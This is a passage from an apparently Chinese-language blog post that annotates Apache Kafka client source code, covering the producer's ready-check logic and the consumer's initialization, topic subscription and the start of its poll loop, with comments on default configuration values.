sendProduceRequests(batches, now);</span><br><span class="line">    <span class="keyword">return</span> pollTimeout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否准备发送</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ReadyCheckResult <span class="title">ready</span><span class="params">(Cluster cluster, <span class="keyword">long</span> nowMs)</span> </span>&#123;</span><br><span class="line">    Set&lt;Node&gt; readyNodes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    <span class="keyword">long</span> nextReadyCheckDelayMs = Long.MAX_VALUE;</span><br><span class="line">    Set&lt;String&gt; unknownLeaderTopics = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> exhausted = <span class="keyword">this</span>.free.queued() &gt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;TopicPartition, Deque&lt;ProducerBatch&gt;&gt; entry : <span class="keyword">this</span>.batches.entrySet()) &#123;</span><br><span class="line">        Deque&lt;ProducerBatch&gt; deque = entry.getValue();</span><br><span class="line">        <span class="keyword">synchronized</span> (deque) &#123;</span><br><span class="line">            <span class="comment">// When producing to a large number of partitions, this path is hot and deques are often empty.</span></span><br><span class="line">            <span class="comment">// We check whether a batch exists first to avoid the more expensive checks whenever possible.</span></span><br><span class="line">            ProducerBatch batch = deque.peekFirst();</span><br><span class="line">            <span class="keyword">if</span> (batch != <span class="keyword">null</span>) &#123;</span><br><span class="line">                TopicPartition part = entry.getKey();</span><br><span class="line">                Node leader = cluster.leaderFor(part);</span><br><span class="line">                <span class="keyword">if</span> (leader == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// This is a partition for which leader is not known, but messages are available to send.</span></span><br><span class="line">                    <span class="comment">// Note that entries are currently not removed from batches when deque is empty.</span></span><br><span class="line">                    unknownLeaderTopics.add(part.topic());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!readyNodes.contains(leader) &amp;&amp; !isMuted(part)) &#123;</span><br><span class="line">                    <span class="keyword">long</span> waitedTimeMs = batch.waitedTimeMs(nowMs);</span><br><span class="line">                    <span class="comment">// 如果不是第一次拉取，  且等待时间小于重试时间 默认100ms ,backingOff=true</span></span><br><span class="line">                    <span class="keyword">boolean</span> backingOff = batch.attempts() &gt; <span class="number">0</span> &amp;&amp; waitedTimeMs &lt; retryBackoffMs;</span><br><span class="line">                    <span class="comment">// 如果backingOff是true 取retryBackoffMs； 如果不是第一次拉取取lingerMs，默认0</span></span><br><span class="line">                    <span class="keyword">long</span> timeToWaitMs = backingOff ? retryBackoffMs : lingerMs;</span><br><span class="line">                    <span class="comment">// 批次大小满足发送条件</span></span><br><span class="line">                    <span class="keyword">boolean</span> full = deque.size() &gt; <span class="number">1</span> || batch.isFull();</span><br><span class="line">                    <span class="comment">// 如果超时，也要发送</span></span><br><span class="line">                    <span class="keyword">boolean</span> expired = waitedTimeMs &gt;= timeToWaitMs;</span><br><span class="line">                    <span class="keyword">boolean</span> transactionCompleting = transactionManager != <span class="keyword">null</span> &amp;&amp; transactionManager.isCompleting();</span><br><span class="line">                    <span class="comment">// full linger.ms</span></span><br><span class="line">                    <span class="keyword">boolean</span> sendable = full</span><br><span class="line">                        || expired</span><br><span class="line">                        || exhausted</span><br><span class="line">                        || closed</span><br><span class="line">                        || flushInProgress()</span><br><span class="line">                        || transactionCompleting;</span><br><span class="line">                    <span class="keyword">if</span> (sendable &amp;&amp; !backingOff) &#123;</span><br><span class="line">                        readyNodes.add(leader);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">long</span> timeLeftMs = Math.max(timeToWaitMs - waitedTimeMs, <span class="number">0</span>);</span><br><span class="line">                        <span class="comment">// Note that this results in a conservative estimate since an un-sendable partition may have</span></span><br><span class="line">                        <span class="comment">// a leader that will later be found to have sendable data. However, this is good enough</span></span><br><span class="line">                        <span class="comment">// since we'll just wake up and then sleep again for the remaining time.</span></span><br><span class="line">                        nextReadyCheckDelayMs = Math.min(timeLeftMs, nextReadyCheckDelayMs);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ReadyCheckResult(readyNodes, nextReadyCheckDelayMs, unknownLeaderTopics);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>二、消费者源码</h1><p><img src="http://qnypic.shawncoding.top/blog/202401251335152.png" alt></p><h2 id="1、初始化-v2">1、初始化</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251335153.png" alt></p><p>点击 main()方法中的 KafkaConsumer ()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">KafkaConsumer(ConsumerConfig config, Deserializer&lt;K&gt; keyDeserializer, Deserializer&lt;V&gt; valueDeserializer) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 消费组平衡</span></span><br><span class="line">        GroupRebalanceConfig groupRebalanceConfig = <span class="keyword">new</span> GroupRebalanceConfig(config,</span><br><span class="line">                GroupRebalanceConfig.ProtocolType.CONSUMER);</span><br><span class="line">        <span class="comment">// 获取消费者组id</span></span><br><span class="line">        <span class="keyword">this</span>.groupId = Optional.ofNullable(groupRebalanceConfig.groupId);</span><br><span class="line">        <span class="comment">// 客户端id</span></span><br><span class="line">        <span class="keyword">this</span>.clientId = config.getString(CommonClientConfigs.CLIENT_ID_CONFIG);</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 客户端请求服务端等待时间request.timeout.ms 默认是30s</span></span><br><span class="line">        <span class="keyword">this</span>.requestTimeoutMs = config.getInt(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG);</span><br><span class="line">        <span class="keyword">this</span>.defaultApiTimeoutMs = config.getInt(ConsumerConfig.DEFAULT_API_TIMEOUT_MS_CONFIG);</span><br><span class="line">        <span class="keyword">this</span>.time = Time.SYSTEM;</span><br><span class="line">        <span class="keyword">this</span>.metrics = buildMetrics(config, time, clientId);</span><br><span class="line">        <span class="comment">// 重试时间 100</span></span><br><span class="line">        <span class="keyword">this</span>.retryBackoffMs = config.getLong(ConsumerConfig.RETRY_BACKOFF_MS_CONFIG);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 拦截器</span></span><br><span class="line">        List&lt;ConsumerInterceptor&lt;K, V&gt;&gt; interceptorList = (List) config.getConfiguredInstances(</span><br><span class="line">                ConsumerConfig.INTERCEPTOR_CLASSES_CONFIG,</span><br><span class="line">                ConsumerInterceptor<span class="class">.<span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">                <span class="title">Collections</span>.<span class="title">singletonMap</span>(<span class="title">ConsumerConfig</span>.<span class="title">CLIENT_ID_CONFIG</span>, <span class="title">clientId</span>))</span>;</span><br><span class="line">        <span class="keyword">this</span>.interceptors = <span class="keyword">new</span> ConsumerInterceptors&lt;&gt;(interceptorList);</span><br><span class="line">        <span class="comment">// key和value 的反序列化</span></span><br><span class="line">        <span class="keyword">if</span> (keyDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.keyDeserializer = config.getConfiguredInstance(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, Deserializer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="keyword">this</span>.keyDeserializer.configure(config.originals(Collections.singletonMap(ConsumerConfig.CLIENT_ID_CONFIG, clientId)), <span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            config.ignore(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG);</span><br><span class="line">            <span class="keyword">this</span>.keyDeserializer = keyDeserializer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (valueDeserializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.valueDeserializer = config.getConfiguredInstance(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, Deserializer<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            <span class="keyword">this</span>.valueDeserializer.configure(config.originals(Collections.singletonMap(ConsumerConfig.CLIENT_ID_CONFIG, clientId)), <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            config.ignore(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG);</span><br><span class="line">            <span class="keyword">this</span>.valueDeserializer = valueDeserializer;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// offset从什么位置开始消费 默认，latest</span></span><br><span class="line">        OffsetResetStrategy offsetResetStrategy = OffsetResetStrategy.valueOf(config.getString(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG).toUpperCase(Locale.ROOT));</span><br><span class="line">        <span class="keyword">this</span>.subscriptions = <span class="keyword">new</span> SubscriptionState(logContext, offsetResetStrategy);</span><br><span class="line">        ClusterResourceListeners clusterResourceListeners = configureClusterResourceListeners(keyDeserializer,</span><br><span class="line">                valueDeserializer, metrics.reporters(), interceptorList);</span><br><span class="line">        <span class="comment">// 元数据</span></span><br><span class="line">        <span class="comment">// retryBackoffMs 重试时间</span></span><br><span class="line">        <span class="comment">// 是否允许访问系统主题 exclude.internal.topics  默认是true，表示不允许</span></span><br><span class="line">        <span class="comment">// 是否允许自动创建topic  allow.auto.create.topics 默认是true</span></span><br><span class="line">        <span class="keyword">this</span>.metadata = <span class="keyword">new</span> ConsumerMetadata(retryBackoffMs,</span><br><span class="line">                config.getLong(ConsumerConfig.METADATA_MAX_AGE_CONFIG),</span><br><span class="line">                !config.getBoolean(ConsumerConfig.EXCLUDE_INTERNAL_TOPICS_CONFIG),</span><br><span class="line">                config.getBoolean(ConsumerConfig.ALLOW_AUTO_CREATE_TOPICS_CONFIG),</span><br><span class="line">                subscriptions, logContext, clusterResourceListeners);</span><br><span class="line">        <span class="comment">// 连接kafka集群</span></span><br><span class="line">        List&lt;InetSocketAddress&gt; addresses = ClientUtils.parseAndValidateAddresses(</span><br><span class="line">                config.getList(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG), config.getString(ConsumerConfig.CLIENT_DNS_LOOKUP_CONFIG));</span><br><span class="line">        <span class="keyword">this</span>.metadata.bootstrap(addresses);</span><br><span class="line">        String metricGrpPrefix = <span class="string">"consumer"</span>;</span><br><span class="line"></span><br><span class="line">        FetcherMetricsRegistry metricsRegistry = <span class="keyword">new</span> FetcherMetricsRegistry(Collections.singleton(CLIENT_ID_METRIC_TAG), metricGrpPrefix);</span><br><span class="line">        ChannelBuilder channelBuilder = ClientUtils.createChannelBuilder(config, time, logContext);</span><br><span class="line">        <span class="keyword">this</span>.isolationLevel = IsolationLevel.valueOf(</span><br><span class="line">                config.getString(ConsumerConfig.ISOLATION_LEVEL_CONFIG).toUpperCase(Locale.ROOT));</span><br><span class="line">        Sensor throttleTimeSensor = Fetcher.throttleTimeSensor(metrics, metricsRegistry);</span><br><span class="line">        <span class="keyword">int</span> heartbeatIntervalMs = config.getInt(ConsumerConfig.HEARTBEAT_INTERVAL_MS_CONFIG);</span><br><span class="line"></span><br><span class="line">        ApiVersions apiVersions = <span class="keyword">new</span> ApiVersions();</span><br><span class="line">        <span class="comment">// 创建客户端对象</span></span><br><span class="line">        <span class="comment">// 连接重试时间 默认50ms</span></span><br><span class="line">        <span class="comment">// 最大连接重试时间 默认1s</span></span><br><span class="line">        <span class="comment">// 发送缓存 默认128kb</span></span><br><span class="line">        <span class="comment">// 接收缓存  默认64kb</span></span><br><span class="line">        <span class="comment">// 客户端请求服务端等待时间request.timeout.ms 默认是30s</span></span><br><span class="line">        NetworkClient netClient = <span class="keyword">new</span> NetworkClient(</span><br><span class="line">                <span class="keyword">new</span> Selector(config.getLong(ConsumerConfig.CONNECTIONS_MAX_IDLE_MS_CONFIG), metrics, time, metricGrpPrefix, channelBuilder, logContext),</span><br><span class="line">                <span class="keyword">this</span>.metadata,</span><br><span class="line">                clientId,</span><br><span class="line">                <span class="number">100</span>, <span class="comment">// a fixed large enough value will suffice for max in-flight requests</span></span><br><span class="line">                config.getLong(ConsumerConfig.RECONNECT_BACKOFF_MS_CONFIG),</span><br><span class="line">                config.getLong(ConsumerConfig.RECONNECT_BACKOFF_MAX_MS_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.SEND_BUFFER_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.RECEIVE_BUFFER_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG),</span><br><span class="line">                config.getLong(ConsumerConfig.SOCKET_CONNECTION_SETUP_TIMEOUT_MS_CONFIG),</span><br><span class="line">                config.getLong(ConsumerConfig.SOCKET_CONNECTION_SETUP_TIMEOUT_MAX_MS_CONFIG),</span><br><span class="line">                time,</span><br><span class="line">                <span class="keyword">true</span>,</span><br><span class="line">                apiVersions,</span><br><span class="line">                throttleTimeSensor,</span><br><span class="line">                logContext);</span><br><span class="line">        <span class="comment">// 消费者客户端</span></span><br><span class="line">        <span class="comment">// 客户端请求服务端等待时间request.timeout.ms 默认是30s</span></span><br><span class="line">        <span class="keyword">this</span>.client = <span class="keyword">new</span> ConsumerNetworkClient(</span><br><span class="line">                logContext,</span><br><span class="line">                netClient,</span><br><span class="line">                metadata,</span><br><span class="line">                time,</span><br><span class="line">                retryBackoffMs,</span><br><span class="line">                config.getInt(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG),</span><br><span class="line">                heartbeatIntervalMs); <span class="comment">//Will avoid blocking an extended period of time to prevent heartbeat thread starvation</span></span><br><span class="line">        <span class="comment">// 消费者分区分配策略</span></span><br><span class="line">        <span class="keyword">this</span>.assignors = ConsumerPartitionAssignor.getAssignorInstances(</span><br><span class="line">                config.getList(ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG),</span><br><span class="line">                config.originals(Collections.singletonMap(ConsumerConfig.CLIENT_ID_CONFIG, clientId))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// no coordinator will be constructed for the default (null) group id</span></span><br><span class="line">        <span class="comment">//  为消费者组准备的</span></span><br><span class="line">        <span class="comment">// auto.commit.interval.ms  自动提交offset时间 默认5s</span></span><br><span class="line">        <span class="keyword">this</span>.coordinator = !groupId.isPresent() ? <span class="keyword">null</span> :</span><br><span class="line">            <span class="keyword">new</span> ConsumerCoordinator(groupRebalanceConfig,</span><br><span class="line">                    logContext,</span><br><span class="line">                    <span class="keyword">this</span>.client,</span><br><span class="line">                    assignors,</span><br><span class="line">                    <span class="keyword">this</span>.metadata,</span><br><span class="line">                    <span class="keyword">this</span>.subscriptions,</span><br><span class="line">                    metrics,</span><br><span class="line">                    metricGrpPrefix,</span><br><span class="line">                    <span class="keyword">this</span>.time,</span><br><span class="line">                    enableAutoCommit,</span><br><span class="line">                    config.getInt(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG),</span><br><span class="line">                    <span class="keyword">this</span>.interceptors,</span><br><span class="line">                    config.getBoolean(ConsumerConfig.THROW_ON_FETCH_STABLE_OFFSET_UNSUPPORTED));</span><br><span class="line">        <span class="comment">// 配置抓数据的参数</span></span><br><span class="line">        <span class="comment">// fetch.min.bytes 默认最少一次抓取1个字节</span></span><br><span class="line">        <span class="comment">// fetch.max.bytes 默认最多一次抓取50m</span></span><br><span class="line">        <span class="comment">// fetch.max.wait.ms 抓取等待最大时间 500ms</span></span><br><span class="line">        <span class="comment">// max.partition.fetch.bytes 默认是1m</span></span><br><span class="line">        <span class="comment">// max.poll.records  默认一次处理500条</span></span><br><span class="line">        <span class="keyword">this</span>.fetcher = <span class="keyword">new</span> Fetcher&lt;&gt;(</span><br><span class="line">                logContext,</span><br><span class="line">                <span class="keyword">this</span>.client,</span><br><span class="line">                config.getInt(ConsumerConfig.FETCH_MIN_BYTES_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.FETCH_MAX_BYTES_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.FETCH_MAX_WAIT_MS_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.MAX_PARTITION_FETCH_BYTES_CONFIG),</span><br><span class="line">                config.getInt(ConsumerConfig.MAX_POLL_RECORDS_CONFIG),</span><br><span class="line">                config.getBoolean(ConsumerConfig.CHECK_CRCS_CONFIG),</span><br><span class="line">                config.getString(ConsumerConfig.CLIENT_RACK_CONFIG),</span><br><span class="line">                <span class="keyword">this</span>.keyDeserializer,</span><br><span class="line">                <span class="keyword">this</span>.valueDeserializer,</span><br><span class="line">                <span class="keyword">this</span>.metadata,</span><br><span class="line">                <span class="keyword">this</span>.subscriptions,</span><br><span class="line">                metrics,</span><br><span class="line">                metricsRegistry,</span><br><span class="line">                <span class="keyword">this</span>.time,</span><br><span class="line">                <span class="keyword">this</span>.retryBackoffMs,</span><br><span class="line">                <span class="keyword">this</span>.requestTimeoutMs,</span><br><span class="line">                isolationLevel,</span><br><span class="line">                apiVersions);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.kafkaConsumerMetrics = <span class="keyword">new</span> KafkaConsumerMetrics(metrics, metricGrpPrefix);</span><br><span class="line"></span><br><span class="line">        config.logUnused();</span><br><span class="line">        AppInfoParser.registerAppInfo(JMX_PREFIX, clientId, metrics, time.milliseconds());</span><br><span class="line">        log.debug(<span class="string">"Kafka consumer initialized"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">        <span class="comment">// call close methods if internal objects are already constructed; this is to prevent resource leak. see KAFKA-2121</span></span><br><span class="line">        <span class="comment">// we do not need to call `close` at all when `log` is null, which means no internal objects were initialized.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.log != <span class="keyword">null</span>) &#123;</span><br><span class="line">            close(<span class="number">0</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// now propagate the exception</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> KafkaException(<span class="string">"Failed to construct kafka consumer"</span>, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2、消费者订阅主题">2、消费者订阅主题</h2><p>点击自己编写的 CustomConsumer.java 中的 subscribe ()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">subscribe</span><span class="params">(Collection&lt;String&gt; topics, ConsumerRebalanceListener listener)</span> </span>&#123;</span><br><span class="line">    acquireAndEnsureOpen();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        maybeThrowInvalidGroupIdException();</span><br><span class="line">        <span class="comment">// 要订阅的主题如果为null ，直接抛异常</span></span><br><span class="line">        <span class="keyword">if</span> (topics == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Topic collection to subscribe to cannot be null"</span>);</span><br><span class="line">        <span class="comment">// 要订阅的主题如果为空</span></span><br><span class="line">        <span class="keyword">if</span> (topics.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">// treat subscribing to empty topic list as the same as unsubscribing</span></span><br><span class="line">            <span class="keyword">this</span>.unsubscribe();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 正常的处理操作</span></span><br><span class="line">            <span class="keyword">for</span> (String topic : topics) &#123;</span><br><span class="line">                <span class="comment">// 如果为空  抛异常</span></span><br><span class="line">                <span class="keyword">if</span> (Utils.isBlank(topic))</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Topic collection to subscribe to cannot contain null or empty topic"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            throwIfNoAssignorsConfigured();</span><br><span class="line">            fetcher.clearBufferedDataForUnassignedTopics(topics);</span><br><span class="line">            log.info(<span class="string">"Subscribed to topic(s): &#123;&#125;"</span>, Utils.join(topics, <span class="string">", "</span>));</span><br><span class="line">            <span class="comment">//  订阅主题（判断你是否需要更新订阅的主题；  主题了一个监听器listener）</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.subscriptions.subscribe(<span class="keyword">new</span> HashSet&lt;&gt;(topics), listener))</span><br><span class="line">                <span class="comment">// 更新订阅信息</span></span><br><span class="line">                metadata.requestUpdateForNewTopics();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        release();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">subscribe</span><span class="params">(Set&lt;String&gt; topics, ConsumerRebalanceListener listener)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 注册负载均衡监听器</span></span><br><span class="line">    registerRebalanceListener(listener);</span><br><span class="line">    <span class="comment">// 按照主题自动订阅模式</span></span><br><span class="line">    setSubscriptionType(SubscriptionType.AUTO_TOPICS);</span><br><span class="line">    <span class="comment">// 判断是否需要更改订阅的主题</span></span><br><span class="line">    <span class="keyword">return</span> changeSubscription(topics);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">changeSubscription</span><span class="params">(Set&lt;String&gt; topicsToSubscribe)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 如果传入的topics 和以前订阅的主题一致，那就不需要更改对应订阅的主题</span></span><br><span class="line">    <span class="keyword">if</span> (subscription.equals(topicsToSubscribe))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    subscription = topicsToSubscribe;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、消费者拉取和处理数据">3、消费者拉取和处理数据</h2><p><img src="http://qnypic.shawncoding.top/blog/202401251335154.png" alt></p><h3 id="3-1-消费总体流程">3.1 消费总体流程</h3><p>点击自己编写的 CustomConsumer.java 中的 poll ()方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ConsumerRecords&lt;K, V&gt; <span class="title">poll</span><span class="params">(<span class="keyword">final</span> Timer timer, <span class="keyword">final</span> <span class="keyword">boolean</span> includeMetadataInTimeout)</span> </span>&#123;</span><br><span class="line">  acquireAndEnsureOpen();</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.kafkaConsumerMetrics.recordPollStart(timer.currentTimeMs());</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.subscriptions.hasNoSubscriptionOrUserAssignment()) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Consumer is not subscribed to any topics or assigned any partitions"</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">          client.maybeTriggerWakeup();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (includeMetadataInTimeout) &#123;</span><br><span class="line">              <span class="comment">// 1、消费者或者消费者组的初始化</span></span><br><span class="line">              <span class="comment">// try to update assignment metadata BUT do not need to block on the timer for join group</span></span><br><span class="line">              updateAssignmentMetadataIfNeeded(timer, <span class="keyword">false</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">while</span> 